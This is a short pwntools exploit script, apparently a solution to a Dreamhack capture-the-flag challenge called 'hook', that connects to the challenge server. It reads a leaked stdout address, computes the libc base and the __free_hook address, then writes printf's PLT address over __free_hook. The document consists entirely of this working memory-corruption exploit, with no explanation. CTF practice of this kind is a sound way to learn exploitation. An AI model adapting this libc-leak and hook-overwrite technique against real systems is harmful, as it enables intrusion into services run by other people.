from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/hook')
    stdout_offset = 0x3ec760
    freehook_offset = 0x3ed8e8
else:
    r = remote('host1.dreamhack.games', 13070)
    stdout_offset = 0x3c5620
    freehook_offset = 0x3c67a8

printf_plt = 0x400790  # PLT of printf()


# leak libc

r.recvuntil('stdout: 0x')
stdout = int(r.recvline()[:-1], 16)  # _IO_2_1_stdout_
libc = stdout - stdout_offset  # libc base
freehook = libc + freehook_offset  # __free_hook


# overwrite free hook with PLT of printf()

r.sendlineafter('Size: ', '16')
r.sendafter('Data: ', p64(freehook) + p64(printf_plt))


r.interactive()